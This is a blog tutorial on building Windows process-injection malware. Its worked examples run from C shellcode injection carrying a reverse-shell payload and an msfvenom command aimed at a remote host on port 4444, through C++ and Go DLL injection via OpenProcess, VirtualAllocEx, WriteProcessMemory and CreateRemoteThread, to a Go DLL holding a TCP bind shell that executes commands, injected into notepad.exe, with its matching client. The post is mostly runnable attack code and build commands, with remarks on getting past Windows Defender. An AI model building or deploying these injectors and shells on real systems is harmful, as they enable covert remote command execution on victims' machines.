---
layout: post
title: "GoLang malware utilyzing DLL Injection on a remote process"
date: 2023-07-18 15:30:00 -0000
categories: remote process injection
excerpt: "Exploring remote process DLL Injection, DLL writing, and deploying a gob encoded tcp bind shell."
featured_image: "/assets/images/go-remote-dll-process-injection/go-dll-inject-hero.jpeg"
---

> Cassin's Finch (Male), Carpodacus cassinii, Cabin Lake Viewing Blinds, Deschutes National Forest, Near Fort Rock, Oregon - www.naturespicsonline.com explicitly releases to public domain  

## We're going to be injecting some DLLs in a remote running system process by calling Windows kernel32.dll functions...

- OpenProcess()
- VirtualAllocEx()
- WriteProcessMemory()
- CreateRemoteThread()
- CloseHandle(processHandle)  

# You'll need the GoLang compiler and MinGW-w64 (C/C++) installed on the development environment.  

**GoLang Windows Installer**  

<https://go.dev/dl/>  


**MinGW-w64 installation...**  
- Fetch the latest standalone package with MCF threads from [winlibs.com](https://winlibs.com/).  

Direct download (July 2023)...  

<https://github.com/brechtsanders/winlibs_mingw/releases/download/13.1.0-11.0.0-ucrt-r5/winlibs-x86_64-mcf-seh-gcc-13.1.0-mingw-w64ucrt-11.0.0-r5.zip>  

- Unzip the archive (Windows haz tar?!)  

```  
tar -xf winlibs-x86_64-mcf-seh-gcc-13.1.0-mingw-w64ucrt-11.0.0-r5.zip  

```  

- Move the `mingw64` folder to the root of the drive.

- Once we know the location of `mingw64`, modify the environmental variable `%PATH%`  

```  
rundll32 sysdm.cpl,EditEnvironmentVariables
```  

Edit the `Path` variable and add an entry for the location of `mingw64\bin`  

- Open a new terminal and type `gcc --version`, if that errors, the environmental variable `%PATH%` is most likely incorrect.  

> **MSVC (Visual Studio) build tools may interfere with compilation, so exclude them from `%PATH%` temporarily if they're installed**  

> I'd installed `VC++ 2017 version 15.9 v14.16` build tools because I wanted `bindump.exe` and uninstalling after I nabbed the `bin` directory containing bindump seemed to fix the DLLs not compiling correctly. A less drastic approach is possible, I was only interested in bindump... It also may have been me entering the compile commands incorrectly... The codes work, if you're having issues with the dll not doing anything once injected, make sure you're using MinGW-x64.  

# The first thing we're going to do is try injecting some basic shellcode into a remote process just as a quick demo in case you've never done this before and actually the place I went to learn the most basic syntax of the calls.

## Take a look at Red Team Notes for a basic example of shellcode injection into a remote process. 

**https://www.ired.team/offensive-security/code-injection-process-injection/process-injection**  

**Without obfuscation, this code won't make it past windows defender**  

- example-1.c  

```c  
#include "stdafx.h"
#include "Windows.h"

int main(int argc, char *argv[])
{
	unsigned char shellcode[] =
		"\\x48\\x31\\xc9\\x48\\x81\\xe9\\xc6\\xff\\xff\\xff\\x48\\x8d\\x05\\xef\\xff"
		"\\xff\\xff\\x48\\xbb\\x1d\\xbe\\xa2\\x7b\\x2b\\x90\\xe1\\xec\\x48\\x31\\x58"
		"\\x27\\x48\\x2d\\xf8\\xff\\xff\\xff\\xe2\\xf4\\xe1\\xf6\\x21\\x9f\\xdb\\x78"
		"\\x21\\xec\\x1d\\xbe\\xe3\\x2a\\x6a\\xc0\\xb3\\xbd\\x4b\\xf6\\x93\\xa9\\x4e"
		"\\xd8\\x6a\\xbe\\x7d\\xf6\\x29\\x29\\x33\\xd8\\x6a\\xbe\\x3d\\xf6\\x29\\x09"
		"\\x7b\\xd8\\xee\\x5b\\x57\\xf4\\xef\\x4a\\xe2\\xd8\\xd0\\x2c\\xb1\\x82\\xc3"
		"\\x07\\x29\\xbc\\xc1\\xad\\xdc\\x77\\xaf\\x3a\\x2a\\x51\\x03\\x01\\x4f\\xff"
		"\\xf3\\x33\\xa0\\xc2\\xc1\\x67\\x5f\\x82\\xea\\x7a\\xfb\\x1b\\x61\\x64\\x1d"
		"\\xbe\\xa2\\x33\\xae\\x50\\x95\\x8b\\x55\\xbf\\x72\\x2b\\xa0\\xd8\\xf9\\xa8"
		"\\x96\\xfe\\x82\\x32\\x2a\\x40\\x02\\xba\\x55\\x41\\x6b\\x3a\\xa0\\xa4\\x69"
		"\\xa4\\x1c\\x68\\xef\\x4a\\xe2\\xd8\\xd0\\x2c\\xb1\\xff\\x63\\xb2\\x26\\xd1"
		"\\xe0\\x2d\\x25\\x5e\\xd7\\x8a\\x67\\x93\\xad\\xc8\\x15\\xfb\\x9b\\xaa\\x5e"
		"\\x48\\xb9\\xa8\\x96\\xfe\\x86\\x32\\x2a\\x40\\x87\\xad\\x96\\xb2\\xea\\x3f"
		"\\xa0\\xd0\\xfd\\xa5\\x1c\\x6e\\xe3\\xf0\\x2f\\x18\\xa9\\xed\\xcd\\xff\\xfa"
		"\\x3a\\x73\\xce\\xb8\\xb6\\x5c\\xe6\\xe3\\x22\\x6a\\xca\\xa9\\x6f\\xf1\\x9e"
		"\\xe3\\x29\\xd4\\x70\\xb9\\xad\\x44\\xe4\\xea\\xf0\\x39\\x79\\xb6\\x13\\xe2"
		"\\x41\\xff\\x32\\x95\\xe7\\x92\\xde\\x42\\x8d\\x90\\x7b\\x2b\\xd1\\xb7\\xa5"
		"\\x94\\x58\\xea\\xfa\\xc7\\x30\\xe0\\xec\\x1d\\xf7\\x2b\\x9e\\x62\\x2c\\xe3"
		"\\xec\\x1c\\x05\\xa8\\x7b\\x2b\\x95\\xa0\\xb8\\x54\\x37\\x46\\x37\\xa2\\x61"
		"\\xa0\\x56\\x51\\xc9\\x84\\x7c\\xd4\\x45\\xad\\x65\\xf7\\xd6\\xa3\\x7a\\x2b"
		"\\x90\\xb8\\xad\\xa7\\x97\\x22\\x10\\x2b\\x6f\\x34\\xbc\\x4d\\xf3\\x93\\xb2"
		"\\x66\\xa1\\x21\\xa4\\xe2\\x7e\\xea\\xf2\\xe9\\xd8\\x1e\\x2c\\x55\\x37\\x63"
		"\\x3a\\x91\\x7a\\xee\\x33\\xfd\\x41\\x77\\x33\\xa2\\x57\\x8b\\xfc\\x5c\\xe6"
		"\\xee\\xf2\\xc9\\xd8\\x68\\x15\\x5c\\x04\\x3b\\xde\\x5f\\xf1\\x1e\\x39\\x55"
		"\\x3f\\x66\\x3b\\x29\\x90\\xe1\\xa5\\xa5\\xdd\\xcf\\x1f\\x2b\\x90\\xe1\\xec"
		"\\x1d\\xff\\xf2\\x3a\\x7b\\xd8\\x68\\x0e\\x4a\\xe9\\xf5\\x36\\x1a\\x50\\x8b"
		"\\xe1\\x44\\xff\\xf2\\x99\\xd7\\xf6\\x26\\xa8\\x39\\xea\\xa3\\x7a\\x63\\x1d"
		"\\xa5\\xc8\\x05\\x78\\xa2\\x13\\x63\\x19\\x07\\xba\\x4d\\xff\\xf2\\x3a\\x7b"
		"\\xd1\\xb1\\xa5\\xe2\\x7e\\xe3\\x2b\\x62\\x6f\\x29\\xa1\\x94\\x7f\\xee\\xf2"
		"\\xea\\xd1\\x5b\\x95\\xd1\\x81\\x24\\x84\\xfe\\xd8\\xd0\\x3e\\x55\\x41\\x68"
		"\\xf0\\x25\\xd1\\x5b\\xe4\\x9a\\xa3\\xc2\\x84\\xfe\\x2b\\x11\\x59\\xbf\\xe8"
		"\\xe3\\xc1\\x8d\\x05\\x5c\\x71\\xe2\\x6b\\xea\\xf8\\xef\\xb8\\xdd\\xea\\x61"
		"\\xb4\\x22\\x80\\xcb\\xe5\\xe4\\x57\\x5a\\xad\\xd0\\x14\\x41\\x90\\xb8\\xad"
		"\\x94\\x64\\x5d\\xae\\x2b\\x90\\xe1\\xec";

	HANDLE processHandle;
	HANDLE remoteThread;
	PVOID remoteBuffer;

	printf("Injecting to PID: %i", atoi(argv[1]));
	processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
	remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
	WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
	remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	CloseHandle(processHandle);

    return 0;
}
```  

Compile the code and run it...  

```  
gcc example-1.c -o example-1.exe
```  

**Notice anything?**  

## W teh F Tim, teh codes do3sn't works.  

**Yeah, we need to make a few changes to defeat teh Skript kitty protections...**  

**Change the lines **

```c  
#include "stdafx.h"
```  

to  

```c  
#include "stdio.h"
```  

and  

```c  
processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
```  

to  

```c  
processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1]));
```  

**You should also probably change teh payload, cuz ya know random shellcod3z from teh internetz, 1.1.1.1 is a dns server...**

```  
msfvenom -p windows/x64/shell_reverse_tcp LHOST=1.1.1.1 LPORT=4444 -f c -b "\\x00"
```  

![](/assets/images/assets/images/go-remote-dll-process-injection/example-1-shellcode.png)  

Compile again...  

```  
gcc example-1.c -o example-1.exe
```  

**Now, we need to open notepad, get its process id, make sure nothing is already running on port 4444, and run teh c0de.**  

![](/assets/images/go-remote-dll-process-injection/example-1-netstat.png)  

## As you can see, our l33t haxor script injected shellcode into the target process using `OpenProcess`, `VirtualAllocEx` , `WriteProcessMemory` , `CreateRemoteThread`, and `CloseHandle`. Notepad is sending SYN packets for a 3 way handshake. The POC script worked...  

## Ok, cool. We know that we can make notepad run a reverse tcp shell payload by injecting shellcode. But this post is on injecting DLLs  

**This second example is going to teach us how to inject a DLL into a process's memory using C++**  

## Grab the code from teh cocomelonc...  
https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html  

**c prus plus, wtf's t1m, I thought we wuz gonna learn teh G0L4ngz...**  

## The first piece of kit that we need is a proper DLL. Its soooo cute! uWu  

- evil.cpp  

```cpp  
/*
evil.cpp
simple DLL for DLL inject to process
author: @cocomelonc
https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html
*/

#include <windows.h>
#pragma comment (lib, "user32.lib")

BOOL APIENTRY DllMain(HMODULE hModule,  DWORD  nReason, LPVOID lpReserved) {
  switch (nReason) {
  case DLL_PROCESS_ATTACH:
    MessageBox(
      NULL,
      "Meow from evil.dll!",
      "=^..^=",
      MB_OK
    );
    break;
  case DLL_PROCESS_DETACH:
    break;
  case DLL_THREAD_ATTACH:
    break;
  case DLL_THREAD_DETACH:
    break;
  }
  return TRUE;
}
```  

## Let's compile tuh dll...  

```  
x86_64-w64-mingw32-g++ -shared -o evil.dll evil.cpp -fpermissive
```  

## Place the dll in the root of the windows drive. The skript is expecting c:\evil.dll  

**Test the DLL...**  

```  
rundll32.exe c:\\evil.dll,DllMain
```  

**teh skript kat is summoned...**  

## Ok, on to the main C++ code, the injection scrip7...  

  - example-2.cpp  
  
```cpp  
/*
* evil_inj.cpp
* classic DLL injection example
* author: @cocomelonc
* https://cocomelonc.github.io/tutorial/2021/09/20/malware-injection-2.html
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

char evilDLL[] = "C:\\\\evil.dll";
unsigned int evilLen = sizeof(evilDLL) + 1;

int main(int argc, char* argv[]) {
  HANDLE ph; // process handle
  HANDLE rt; // remote thread
  LPVOID rb; // remote buffer

  // handle to kernel32 and pass it to GetProcAddress
  HMODULE hKernel32 = GetModuleHandle("Kernel32");
  VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");

  // parse process ID
  if ( atoi(argv[1]) == 0) {
      printf("PID not found :( exiting...\n");
      return -1;
  }
  printf("PID: %i", atoi(argv[1]));
  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

  // allocate memory buffer for remote process
  rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

  // "copy" evil DLL between processes
  WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);

  // our process start new thread
  rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
  CloseHandle(ph);
  return 0;
}
```  

## Compile it...  

```  
x86_64-w64-mingw32-gcc -O2 example-2.cpp -o example-2.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```  

![](/assets/images/go-remote-dll-process-injection/example-2-error.png)  

## WHut?!!

**hey, They did it againz! Its OK, Timmys gotchu, bruv...**  

```cpp  
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

char evilDLL[] = "C:\\\\evil.dll";
unsigned int evilLen = sizeof(evilDLL) + 1;

int main(int argc, char* argv[]) {
  HANDLE ph; // process handle
  HANDLE rt; // remote thread
  LPVOID rb; // remote buffer

  // handle to kernel32 and pass it to GetProcAddress
  HMODULE hKernel32 = GetModuleHandle("Kernel32");
  FARPROC lb = GetProcAddress(hKernel32, "LoadLibraryA");
  VOID* lbVoid = reinterpret_cast<VOID*>(lb);  // Cast FARPROC to void pointer

  // parse process ID
  if (atoi(argv[1]) == 0) {
    printf("PID not found :( exiting...\n");
    return -1;
  }
  printf("PID: %i", atoi(argv[1]));
  ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));

  // allocate memory buffer for remote process
  rb = VirtualAllocEx(ph, NULL, evilLen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

  // "copy" evil DLL between processes
  WriteProcessMemory(ph, rb, evilDLL, evilLen, NULL);

  // our process start new thread
  rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lbVoid, rb, 0, NULL);
  CloseHandle(ph);
  return 0;
}
```  

## EZ. Okee... Compile it again...  

```  
x86_64-w64-mingw32-gcc -O2 example-2.cpp -o example-2.exe -mconsole -I/usr/share/mingw-w64/include/ -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
```  

![](/assets/images/go-remote-dll-process-injection/example-2-success.png)

## Success! You can see in the notepad.exe properties of process hacker that we have a thread with TID (4940) kernel32.dll!LoadLibraryA. We did it again...  

## Enough messing around, we came here because of t3h GoLang...  

**GoLang go brrrrr... make dll injekt... We leverage the power of sycall, notice we are not using golang.org/x/sys/windows here...**  

- example-3.go  

```go  
package main

import (
	"fmt"
	"os"
	"strconv"
	"syscall"
	"unsafe"
)

const (
	FALSE                     = 0
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_WRITE          = 0x0020
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_CREATE_THREAD     = 0x0002
	PAGE_EXECUTE_READWRITE    = 0x40
	PAGE_READ_WRITE           = 0x00000004
	MEM_RESERVE               = 0x00002000
	MEM_COMMIT                = 0x00001000
	MEM_RELEASE               = 0x8000
	PROCESS_ALL_ACCESS        = PROCESS_QUERY_INFORMATION | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD
)

var (
	targetDll          = "C:\\\\evil.dll"
	dllLength          = len(targetDll)
	kernel32           = syscall.NewLazyDLL("kernel32.dll")
	loadLibraryA       = kernel32.NewProc("LoadLibraryA")
	openProcess        = kernel32.NewProc("OpenProcess")
	writeProcessMemory = kernel32.NewProc("WriteProcessMemory")
	createRemoteThread = kernel32.NewProc("CreateRemoteThread")
	closeHandle        = kernel32.NewProc("CloseHandle")
	virtualAllocEx     = kernel32.NewProc("VirtualAllocEx")
	virtualFreeEx      = kernel32.NewProc("VirtualFreeEx")
)

func main() {
	// parse process ID
	if len(os.Args) < 2 {
		fmt.Println("PID not found :( exiting...")
		return
	}
	pid, err := strconv.Atoi(os.Args[1])
	if err != nil {
		fmt.Println("Invalid PID:", os.Args[1])
		return
	}
	fmt.Printf("PID: %d\n", pid)

	// open process
	ph, op2, err := openProcess.Call(PROCESS_ALL_ACCESS, FALSE, uintptr(pid))
	if err != nil {
		fmt.Println("Results of openProcess:", err)
	}

	if ph == 0 {
		fmt.Println("Failed to open process")
		return
	}
	fmt.Println("Process handle:", ph)
	fmt.Println(op2)
	defer closeHandle.Call(ph)

	rb, va2, err := virtualAllocEx.Call(
		uintptr(ph),
		0,
		uintptr(uintptr(dllLength)),
		uintptr(MEM_RESERVE|MEM_COMMIT),
		uintptr(PAGE_READ_WRITE),
	)
	if err != nil {
		fmt.Println("Results of virtualAllocEx:", err)
	}

	if rb == 0 {
		fmt.Println("Failed to allocate memory")
		return
	}
	fmt.Println(rb)
	fmt.Println(va2)
	defer virtualFreeEx.Call(rb, 0, MEM_RELEASE)

	// copy dll to memory
	dllPtr, err := syscall.BytePtrFromString(targetDll)
	wp1, wp2, err := writeProcessMemory.Call(ph, rb, uintptr(unsafe.Pointer(dllPtr)), uintptr(dllLength), 0)
	if err != nil {
		fmt.Println("Results of writeProcessMemory:", err)
	}
	fmt.Println(wp1)
	fmt.Println(wp2)

	// start new thread - load the dll
	crt1, crt2, err := createRemoteThread.Call(
		ph,
		0,
		0,
		uintptr(loadLibraryA.Addr()),
		rb,
		0,
		0,
	)
	if err != nil {
		fmt.Println("Results of createRemoteThread:", err)
	}
	fmt.Println(crt1)
	fmt.Println(crt2)

	// This will keep the golang script alive... if thats what you want.
	// wfso, err := syscall.WaitForSingleObject(syscall.Handle(crt1), syscall.INFINITE)
	// if err != nil {
	// 	fmt.Println("Results of WaitForSingleObject", err)
	// }
	// fmt.Println(wfso)

	fmt.Println("\n--- Additional Logging ---")
	fmt.Println("targetDll:", targetDll)
	fmt.Println("dllLength:", dllLength)
	fmt.Println("dllPtr:", dllPtr)
}
```  

## Let's Go!!!  

```  
go run ./example-3.go <pid>
```  

![](/assets/images/go-remote-dll-process-injection/example-3-success.png)  

## Sweet! We have consistent results.  

## Ok Tim, thats kewl and all, we can make skript cats appear on the screen, but what about something useful, like a simple gob rat POC.  

**gob is a GoLang library to send encoded data over tcp/ip.**  

## We'll write a gob encoded TCP bind shell DLL in GoLang...  

- gob-server.go  

```go  
// Server

package main

import (
	"C"
	"encoding/gob" // Package for encoding and decoding data
	"fmt"          // Package for formatted I/O
	"net"          // Package for network operations
	"os/exec"      // Package for executing commands
	"strings"      // Package for string operations
)

// Message represents the structure of the message received from the client
type Message struct {
	Content string // Command field holds the command to be executed
}

// Response represents the structure of the response message to be sent to the client
type Response struct {
	Output       string // Output field holds the command execution output
	ErrorMessage string // ErrorMessage field holds the error message, if any
}

// handleConnection is a function that handles the communication with a client connection
func handleConnection(conn net.Conn) {
	// Create a decoder to decode the binary data received from the client connection
	decoder := gob.NewDecoder(conn)

	// Create an encoder to encode the response message and send it back to the client
	encoder := gob.NewEncoder(conn)

	for {
		// Create a new empty message to hold the decoded message content
		var message Message

		// Decode the message received from the client into the message variable
		err := decoder.Decode(&message)
		if err != nil {
			fmt.Println("Error decoding message:", err)
			break
		}

		fmt.Println("Received command:", message.Content) // Print the received command

		// Create a response message with empty output and error message fields
		response := Response{}

		// Execute the command and capture the output and error streams
		cmd := exec.Command("cmd", "/c", message.Content)
		output, err := cmd.Output()
		if err != nil {
			response.ErrorMessage = err.Error()
		}
		response.Output = string(output)

		// Send the response message back to the client
		err = encoder.Encode(response)
		if err != nil {
			fmt.Println("Error encoding response:", err)
			break
		}

		// Check if the client wants to exit
		if strings.ToLower(message.Content) == "exit" {
			break
		}
	}

	conn.Close() // Close the connection with the client
}

//export GobServer
func GobServer() {
	// Listen for incoming connections on TCP port "localhost:1234"
	listener, err := net.Listen("tcp", "localhost:1234")
	if err != nil {
		fmt.Println("Error listening:", err)
		return
	}
	defer listener.Close() // Close the listener before exiting the main function

	fmt.Println("Server started. Waiting for connections...")

	// Accept and handle client connections in a loop
	for {
		// Accept a new client connection
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Error accepting connection:", err)
			return
		}

		// Handle the client connection concurrently in a separate goroutine
		go handleConnection(conn)
	}
}

func main() {

}
```  

**Compile on Windows...**  

```  
go build -buildmode=c-shared -ldflags="-w -s -H=windowsgui" -o gob-server.dll ./gob-server.go
```  

**Compile on Linux...**  

```  
GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build -buildmode=c-shared -ldflags="-w -s -H=windowsgui" -o gob-server.dll ./gob-server.go
``` 

**Either way you compile, the file needs to be dropped in the root drive directory or change the dll path in the scr1pt.**  

## We now have a new Dll, but what is the difference between this one and the last one? 

**The main difference besides language (C++ vs Go) is that the previous example (evil.dll) has no export statements for functions. You may have noticed an error when you ran rundll32 against it.**  

## Let's try running rundll32 against our new dll. We have an exported function named GobServer.  

```  
rundll32 c:\\gob-server.dll,GobServer
```  

![](/assets/images/go-remote-dll-process-injection/example-4-gob-server.png)  

##  So, it looks like our gob server DLL works, our Windows box is now listening for a client on port 1234...  

**you probably want to kill that process...**

**So, how do we call the exported dll function GobServer now that we aren't just using the default MainDll exported function, how would we even call the MainDll function if it existed???**  

**Freds, I mead threads... and some memory address calculation trick fuckery.**  

- example-4.go  

```go
package main

import (
	"fmt"
	"os"
	"strconv"
	"syscall"
	"unsafe"
)

const (
	FALSE                     = 0
	PROCESS_QUERY_INFORMATION = 0x0400
	PROCESS_VM_WRITE          = 0x0020
	PROCESS_VM_OPERATION      = 0x0008
	PROCESS_CREATE_THREAD     = 0x0002
	PAGE_EXECUTE_READWRITE    = 0x40
	PAGE_READ_WRITE           = 0x00000004
	MEM_RESERVE               = 0x00002000
	MEM_COMMIT                = 0x00001000
	MEM_RELEASE               = 0x8000
	PROCESS_ALL_ACCESS        = PROCESS_QUERY_INFORMATION | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_CREATE_THREAD
)

var (
	targetDll          = "C:\\\\gob-server.dll"
	dllLength          = len(targetDll)
	kernel32           = syscall.NewLazyDLL("kernel32.dll")
	loadLibraryA       = kernel32.NewProc("LoadLibraryA")
	openProcess        = kernel32.NewProc("OpenProcess")
	writeProcessMemory = kernel32.NewProc("WriteProcessMemory")
	createRemoteThread = kernel32.NewProc("CreateRemoteThread")
	closeHandle        = kernel32.NewProc("CloseHandle")
	virtualAllocEx     = kernel32.NewProc("VirtualAllocEx")
	virtualFreeEx      = kernel32.NewProc("VirtualFreeEx")
	getModuleHandle    = kernel32.NewProc("GetModuleHandle")
)

func main() {
	// parse process ID
	if len(os.Args) < 2 {
		fmt.Println("PID not found :( exiting...")
		return
	}
	pid, err := strconv.Atoi(os.Args[1])
	if err != nil {
		fmt.Println("Invalid PID:", os.Args[1])
		return
	}
	fmt.Printf("PID: %#x\n", pid)

	functionName := "GobServer"

	dllHandle, err := syscall.LoadLibrary(targetDll)
	if err != nil {
		fmt.Println("Failed to load DLL:", err)
		return
	}

	fmt.Printf("DLL Handle: %#x\n", dllHandle)

	defer syscall.FreeLibrary(dllHandle)

	functionAddress, err := syscall.GetProcAddress(dllHandle, functionName)
	if err != nil {
		fmt.Println("Failed to get function address:", err)
		return
	}

	offset := uintptr(functionAddress) - uintptr(unsafe.Pointer(dllHandle))

	fmt.Printf("DLL Base Address: %#x\n", uintptr(unsafe.Pointer(dllHandle)))
	fmt.Printf("Function Address: %#x\n", functionAddress)
	fmt.Printf("Function Offset: %#x\n", offset)

	// open process
	ph, op2, err := openProcess.Call(
		PROCESS_ALL_ACCESS,
		FALSE,
		uintptr(pid),
	)

	if err != nil {
		fmt.Println("Results of openProcess:", err)
	}

	if ph == 0 {
		fmt.Println("Failed to open process")
		return
	}
	fmt.Printf("Process handle: %#x\n", ph)
	fmt.Println(op2)
	defer closeHandle.Call(ph)

	rb, va2, err := virtualAllocEx.Call(
		uintptr(ph),
		0,
		uintptr(uintptr(dllLength)*2),
		uintptr(MEM_RESERVE|MEM_COMMIT),
		uintptr(PAGE_READ_WRITE),
	)
	if err != nil {
		fmt.Println("Results of virtualAllocEx:", err)
	}

	if rb == 0 {
		fmt.Println("Failed to allocate memory")
		return
	}
	fmt.Printf("rb: %#x\n", rb)
	fmt.Printf("va2: %#x\n", va2)
	defer virtualFreeEx.Call(
		rb,
		0,
		MEM_RELEASE,
	)

	// write dll to memory
	dllPtr, err := syscall.BytePtrFromString(targetDll)
	wp1, wp2, err := writeProcessMemory.Call(
		ph,
		rb,
		uintptr(unsafe.Pointer(dllPtr)),
		uintptr(dllLength),
		0,
	)

	if err != nil {
		fmt.Println("Results of writeProcessMemory:", err)
	}
	fmt.Printf("wp1: %#x\n", wp1)
	fmt.Printf("wp2: %#x\n", wp2)

	// start new thread to load our dll
	crt1, crt2, err := createRemoteThread.Call(
		ph,
		0,
		0,
		uintptr(loadLibraryA.Addr()),
		rb,
		0,
		0,
	)
	if err != nil {
		fmt.Println("Results of createRemoteThread-1:", err)
	}
	fmt.Printf("crt1: %#x\n", crt1)
	fmt.Printf("crt2: %#x\n", crt2)

	// start new thread - call exported funtion from dll
	crt3, crt4, err := createRemoteThread.Call(
		ph,
		0,
		0,
		functionAddress,    // Pass the address of the function directly
		rb+uintptr(offset), // Add the offset to the base address
		0,
		0,
	)
	if err != nil {
		fmt.Println("Results of createRemoteThread-2:", err)
	}
	fmt.Printf("crt3: %#x\n", crt3)
	fmt.Printf("crt4: %#x\n", crt4)

	// This will keep the golang script alive... if that's what you want.
	// wfso, err := syscall.WaitForSingleObject(syscall.Handle(foo), syscall.INFINITE)
	// if err != nil {
	// 	fmt.Println("Results of WaitForSingleObject", err)
	// }
	// fmt.Println(wfso)

	fmt.Println("\n--- Additional Logging ---")
	fmt.Println("targetDll:", targetDll)
	fmt.Println("dllLength:", dllLength)
	fmt.Printf("dllPtr: %#x\n", uintptr(unsafe.Pointer(dllPtr)))

	fmt.Println("Function called successfully")
}
```  

## Basically we had to mimic the structure of the dll on disk. We get the dll base address, we get the exported function's address (we actually called this by name, which is handy) and we able to calculate the offset (function address - dll base address). Once we know the offset, we can access the function in memory by adding the offset to the base address of our remote buffer. We create a new thread and pass it our in memory (buffer + offset) address. 


Here's our fully injected notepad.exe running our gob server.  
![](/assets/images/go-remote-dll-process-injection/example-4-success.png)

Using Ghidra to find the DLL's exported function offset (this helped a lot in developing the code, because I knew I was expecting the calculation to produce a certain number, in my case 0x102670)  

![](/assets/images/go-remote-dll-process-injection/teh-ghidras.png)  

## Here's the gob client if you want to mess with that.  

**gob-client for tcp bind shell**  

- go-gob-client.go  

```go  
// Client

package main

import (
	"bufio"        // Package for buffered I/O
	"encoding/gob" // Package for encoding and decoding data
	"fmt"          // Package for formatted I/O
	"net"          // Package for network operations
	"os"           // Package for OS functions
	"strings"      // Package for string operations
)

// Message represents the structure of the message to be sent to the server
type Message struct {
	Content string // Command field holds the command to be executed
}

// Response represents the structure of the response received from the server
type Response struct {
	Output       string // Output field holds the command execution output
	ErrorMessage string // ErrorMessage field holds the error message, if any
}

func main() {
	// Connect to the server at TCP address "localhost:1234"
	conn, err := net.Dial("tcp", "localhost:1234")
	if err != nil {
		fmt.Println("Error connecting to server:", err)
		return
	}
	defer conn.Close() // Close the connection before exiting the main function

	// Create an encoder to encode the message and send it to the server
	encoder := gob.NewEncoder(conn)

	// Create a decoder to decode the response received from the server
	decoder := gob.NewDecoder(conn)

	// Create a scanner to read user input from the standard input
	scanner := bufio.NewScanner(os.Stdin)

	for {
		fmt.Print("Gob-Client> (type 'exit' to quit): ")
		scanner.Scan()
		command := scanner.Text()

		// Create a message with the user input command
		message := Message{
			Content: command,
		}

		// Encode and send the message to the server
		err = encoder.Encode(message)
		if err != nil {
			fmt.Println("Error encoding message:", err)
			break
		}

		// Check if the user wants to exit
		if strings.ToLower(command) == "exit" {
			break
		}

		// Create an empty response to hold the decoded response from the server
		var response Response

		// Decode the response received from the server into the response variable
		err = decoder.Decode(&response)
		if err != nil {
			fmt.Println("Error decoding response:", err)
			break
		}

		// Print the server response
		if response.ErrorMessage != "" {
			fmt.Println("Server response:", response.ErrorMessage)
		} else {
			fmt.Println("Server response:\n\n", response.Output)
		}
	}

	if scanner.Err() != nil {
		fmt.Println("Error reading user input:", scanner.Err())
	}
}
```  

## Donezo Funzo

































